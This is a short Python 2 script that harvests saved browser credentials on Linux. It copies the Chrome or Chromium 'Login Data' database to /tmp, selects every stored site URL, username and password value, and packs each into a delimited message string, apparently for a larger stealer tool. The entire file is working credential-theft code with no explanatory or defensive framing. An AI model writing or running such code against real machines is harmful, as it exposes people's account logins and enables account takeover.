from os import path, remove
import sqlite3 as sql
from shutil import copy
def format_msg(entry):
	msg = str(entry[2].__len__()).zfill(2) + entry[2] + entry[0] + "@" + entry[1] + "#"
	return msg
	
msglist = []
try:
	chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
	if not path.exists(chrome_path):
		chrome_path = path.expanduser("~/.config/chromium/Default/Login Data")
	temp_path = "/tmp/Login Data"
	copy(chrome_path,temp_path)
	db = sql.connect(temp_path)
	cur = db.cursor() 
	cur.execute('select origin_url, username_value, password_value from logins;')
	savedlist = []
	rows = cur.fetchall()
	for row in rows:
		savedlist.append([str(row[0]),str(row[1]),str(row[2])])		
	for entry in savedlist:
		msglist.append(format_msg(entry))
	remove(temp_path)		
except:
	print "Fail"
	pass
print msglist
#return msglist
